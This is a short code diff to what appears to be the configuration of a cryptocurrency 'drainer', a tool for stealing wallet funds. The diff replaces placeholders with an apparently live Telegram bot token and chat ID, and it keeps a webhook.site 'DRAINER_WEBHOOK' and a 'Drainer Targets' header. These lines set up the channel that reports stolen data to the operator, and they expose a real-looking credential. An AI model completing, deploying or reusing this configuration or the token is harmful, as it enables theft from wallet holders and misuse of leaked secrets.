@@ -1,6 +1,6 @@
 // CONFIG - REPLACE THESE
-const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; // From @BotFather
-const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';    // From @userinfobot
+const TELEGRAM_BOT_TOKEN = '7689015696:AAG8Ci3BcoWRlDmziyfq6dVRnL1Hcqw0bxo'; // From @BotFather
+const TELEGRAM_CHAT_ID = '5430364847';    // From @userinfobot
 const DRAINER_WEBHOOK = 'https://webhook.site/YOUR-UNIQUE-ID'; // Optional
 
 // Drainer Targets
